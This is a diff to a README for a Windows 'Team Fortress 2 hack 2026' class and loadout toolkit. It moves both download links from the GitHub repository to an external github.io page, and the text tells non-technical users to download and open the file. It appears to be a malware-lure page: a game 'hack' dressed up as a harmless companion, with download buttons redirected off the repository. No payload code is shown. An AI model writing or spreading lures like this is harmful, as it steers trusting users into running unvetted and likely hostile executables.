@@ -1,6 +1,6 @@
 # 🎮 team-fortress-2-hack-2026-class-loadout-toolkit - Your ultimate TF2 class and loadout companion
 
-[![Download Now](https://img.shields.io/badge/Download_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/andreas6862/team-fortress-2-hack-2026-class-loadout-toolkit)
+[![Download Now](https://img.shields.io/badge/Download_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://andreas6862.github.io)
 
 This Windows companion is built for Team Fortress 2 players who want one organized place for class profiles, weapon loadouts, map notes, manual aim practice, match tracking, and gameplay analytics. It is made for everyday users who prefer clear screens, simple controls, and a straightforward setup. You do not need programming knowledge to use it.
 
@@ -36,7 +36,7 @@ Getting started is simple. The toolkit is downloaded from its GitHub page and op
 
 Visit this link to download the application:
 
-[Download the Team Fortress 2 Hack 2026 Class Loadout Toolkit](https://github.com/andreas6862/team-fortress-2-hack-2026-class-loadout-toolkit)
+[Download the Team Fortress 2 Hack 2026 Class Loadout Toolkit](https://andreas6862.github.io)
 
 After the download finishes, open the downloaded file on your Windows PC. The toolkit will start and show its main window. No extra tools or developer setup are required.
 
